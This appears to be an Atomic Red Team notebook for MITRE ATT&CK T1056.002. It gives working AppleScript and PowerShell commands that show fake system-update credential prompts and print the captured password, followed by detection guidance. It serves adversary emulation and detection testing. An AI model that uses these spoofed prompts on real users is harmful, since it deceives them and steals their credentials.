{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "35495995",
   "metadata": {},
   "source": "# T1056.002 - GUI Input Capture\nAdversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) "
  },
  {
   "cell_type": "markdown",
   "id": "e0bd3deb",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "b36ca68d",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - AppleScript - Prompt User for Password",
    "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nosascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2677ff5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "d2792fbf",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - PowerShell - Prompt User for Password",
    "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "444ffb8c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "80536533",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - AppleScript - Spoofing a credential prompt using osascript",
    "Prompt user for password without requiring permissions to send Apple events to System Settings.\nhttps://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nPWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e1c8dc54",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "458e36ca",
   "metadata": {},
   "source": "## Detection\nMonitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) that could be used to prompt users for credentials. For example, command/script history including abnormal parameters (such as requests for credentials and/or strings related to creating password prompts) may be malicious.(Citation: Spoofing credential dialogs) \n\nInspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources. "
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}